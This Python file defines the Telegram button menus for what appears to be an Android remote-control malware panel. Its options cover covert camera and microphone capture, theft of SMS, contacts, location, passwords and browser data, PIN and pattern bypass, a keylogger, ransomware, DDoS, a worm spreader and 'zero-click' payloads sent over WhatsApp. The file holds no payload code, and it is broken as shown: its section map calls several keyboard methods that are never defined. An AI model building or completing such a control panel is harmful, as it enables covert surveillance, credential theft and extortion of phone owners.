from telegram import InlineKeyboardButton, InlineKeyboardMarkup

class Keyboards:
    
    @staticmethod
    def get_main_keyboard():
        keyboard = [
            [InlineKeyboardButton("📸📹 CAMERA (25)", callback_data="section_camera")],
            [InlineKeyboardButton("🎙️🔊 AUDIO (20)", callback_data="section_audio")],
            [InlineKeyboardButton("💡✨ FLASHLIGHT (15)", callback_data="section_flash")],
            [InlineKeyboardButton("📳💫 VIBRATION (15)", callback_data="section_vibe")],
            [InlineKeyboardButton("🌐📶 NETWORK (30)", callback_data="section_network")],
            [InlineKeyboardButton("🔒🔓 SECURITY (25)", callback_data="section_security")],
            [InlineKeyboardButton("💾📁 DATA EXTRACTION (30)", callback_data="section_data")],
            [InlineKeyboardButton("📂🗃️ FILE MANAGER (25)", callback_data="section_files")],
            [InlineKeyboardButton("🖥️📱 SCREEN (20)", callback_data="section_screen")],
            [InlineKeyboardButton("📱⚙️ APPS (25)", callback_data="section_apps")],
            [InlineKeyboardButton("⚙️🔧 SYSTEM (30)", callback_data="section_system")],
            [InlineKeyboardButton("⌨️📝 KEYLOGGER (15)", callback_data="section_keylog")],
            [InlineKeyboardButton("🌐🔍 BROWSER (20)", callback_data="section_browser")],
            [InlineKeyboardButton("📱🌐 SOCIAL (15)", callback_data="section_social")],
            [InlineKeyboardButton("💰🔐 CRYPTO (12)", callback_data="section_crypto")],
            [InlineKeyboardButton("⚔️💀 DDOS (12)", callback_data="section_ddos")],
            [InlineKeyboardButton("💀⚠️ RANSOMWARE (12)", callback_data="section_ransom")],
            [InlineKeyboardButton("🪱🐛 SPREADER (12)", callback_data="section_spreader")],
            [InlineKeyboardButton("🎯💀 ZERO-CLICK (20)", callback_data="section_zero")],
            [InlineKeyboardButton("⚡🔧 EXTRA (20)", callback_data="section_extra")],
            [InlineKeyboardButton("📊 STATS", callback_data="stats_menu")],
            [InlineKeyboardButton("❓ HELP", callback_data="help_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_camera_keyboard():
        keyboard = [
            [InlineKeyboardButton("📷 FRONT CAM", callback_data="cam_front"), 
             InlineKeyboardButton("📸 BACK CAM", callback_data="cam_back")],
            [InlineKeyboardButton("🎥 VIDEO 10s", callback_data="video_10"), 
             InlineKeyboardButton("🎬 VIDEO 30s", callback_data="video_30")],
            [InlineKeyboardButton("📸 BURST 5X", callback_data="cam_burst"), 
             InlineKeyboardButton("🌙 NIGHT", callback_data="cam_night")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_audio_keyboard():
        keyboard = [
            [InlineKeyboardButton("🎤 MIC START", callback_data="mic_start"), 
             InlineKeyboardButton("🎤 MIC STOP", callback_data="mic_stop")],
            [InlineKeyboardButton("🔊 SPEAKER ON", callback_data="speaker_on"), 
             InlineKeyboardButton("🔇 SPEAKER OFF", callback_data="speaker_off")],
            [InlineKeyboardButton("🔊 VOL MAX", callback_data="vol_max"), 
             InlineKeyboardButton("🔉 VOL 50%", callback_data="vol_50")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_flash_keyboard():
        keyboard = [
            [InlineKeyboardButton("💡 FLASH ON", callback_data="flash_on"), 
             InlineKeyboardButton("💡 FLASH OFF", callback_data="flash_off")],
            [InlineKeyboardButton("✨ STROBE", callback_data="flash_strobe"), 
             InlineKeyboardButton("💥 SOS", callback_data="flash_sos")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_network_keyboard():
        keyboard = [
            [InlineKeyboardButton("📶 WIFI ON", callback_data="wifi_on"), 
             InlineKeyboardButton("📶 WIFI OFF", callback_data="wifi_off")],
            [InlineKeyboardButton("📱 DATA ON", callback_data="data_on"), 
             InlineKeyboardButton("📱 DATA OFF", callback_data="data_off")],
            [InlineKeyboardButton("✈️ AIRPLANE", callback_data="airplane_toggle"), 
             InlineKeyboardButton("🔗 BLUETOOTH", callback_data="bt_toggle")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_security_keyboard():
        keyboard = [
            [InlineKeyboardButton("🔒 LOCK", callback_data="lock"), 
             InlineKeyboardButton("🔓 UNLOCK", callback_data="unlock")],
            [InlineKeyboardButton("🔢 BYPASS PIN", callback_data="bypass_pin"), 
             InlineKeyboardButton("🔐 BYPASS PATTERN", callback_data="bypass_pattern")],
            [InlineKeyboardButton("💀 FACTORY RESET", callback_data="factory_reset")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_data_keyboard():
        keyboard = [
            [InlineKeyboardButton("💬 SMS", callback_data="get_sms"), 
             InlineKeyboardButton("📞 CALLS", callback_data="get_calls")],
            [InlineKeyboardButton("👥 CONTACTS", callback_data="get_contacts"), 
             InlineKeyboardButton("🌍 LOCATION", callback_data="get_location")],
            [InlineKeyboardButton("📸 PHOTOS", callback_data="get_photos"), 
             InlineKeyboardButton("🎥 VIDEOS", callback_data="get_videos")],
            [InlineKeyboardButton("🔑 PASSWORDS", callback_data="get_passwords"), 
             InlineKeyboardButton("🍪 BROWSER", callback_data="get_browser")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_system_keyboard():
        keyboard = [
            [InlineKeyboardButton("ℹ️ INFO", callback_data="sysinfo"), 
             InlineKeyboardButton("🔋 BATTERY", callback_data="battery")],
            [InlineKeyboardButton("💾 RAM", callback_data="ram_info"), 
             InlineKeyboardButton("📀 STORAGE", callback_data="storage")],
            [InlineKeyboardButton("🔄 REBOOT", callback_data="reboot"), 
             InlineKeyboardButton("⏻ POWER OFF", callback_data="poweroff")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_keylog_keyboard():
        keyboard = [
            [InlineKeyboardButton("⌨️ START", callback_data="keylog_start"), 
             InlineKeyboardButton("⌨️ STOP", callback_data="keylog_stop")],
            [InlineKeyboardButton("📋 GET LOGS", callback_data="keylog_get"), 
             InlineKeyboardButton("🗑️ CLEAR", callback_data="keylog_clear")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_zero_keyboard():
        keyboard = [
            [InlineKeyboardButton("📱 GEN PAYLOAD", callback_data="gen_payload"), 
             InlineKeyboardButton("📸 GEN JPG", callback_data="gen_jpg")],
            [InlineKeyboardButton("🔗 GEN LINK", callback_data="gen_link"), 
             InlineKeyboardButton("📤 SEND WA", callback_data="send_wa")],
            [InlineKeyboardButton("📊 STATUS", callback_data="check_status"), 
             InlineKeyboardButton("🎯 EXPLOIT DB", callback_data="exploit_db")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_extra_keyboard():
        keyboard = [
            [InlineKeyboardButton("🔋 BATTERY SAVE", callback_data="battery_save"), 
             InlineKeyboardButton("⚡ PERFORMANCE", callback_data="performance")],
            [InlineKeyboardButton("🧹 CLEAN JUNK", callback_data="clean_junk"), 
             InlineKeyboardButton("🔍 PORT SCAN", callback_data="port_scan")],
            [InlineKeyboardButton("🌐 IP INFO", callback_data="ip_info"), 
             InlineKeyboardButton("📡 SENSORS", callback_data="sensors")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    @staticmethod
    def get_back_keyboard():
        keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back_main")]]
        return InlineKeyboardMarkup(keyboard)

# Section mapping
SECTION_KEYBOARDS = {
    'section_camera': Keyboards.get_camera_keyboard(),
    'section_audio': Keyboards.get_audio_keyboard(),
    'section_flash': Keyboards.get_flash_keyboard(),
    'section_vibe': Keyboards.get_vibe_keyboard(),
    'section_network': Keyboards.get_network_keyboard(),
    'section_security': Keyboards.get_security_keyboard(),
    'section_data': Keyboards.get_data_keyboard(),
    'section_files': Keyboards.get_file_keyboard(),
    'section_screen': Keyboards.get_screen_keyboard(),
    'section_apps': Keyboards.get_apps_keyboard(),
    'section_system': Keyboards.get_system_keyboard(),
    'section_keylog': Keyboards.get_keylog_keyboard(),
    'section_browser': Keyboards.get_browser_keyboard(),
    'section_social': Keyboards.get_social_keyboard(),
    'section_crypto': Keyboards.get_crypto_keyboard(),
    'section_ddos': Keyboards.get_ddos_keyboard(),
    'section_ransom': Keyboards.get_ransom_keyboard(),
    'section_spreader': Keyboards.get_spreader_keyboard(),
    'section_zero': Keyboards.get_zero_keyboard(),
    'section_extra': Keyboards.get_extra_keyboard()
}
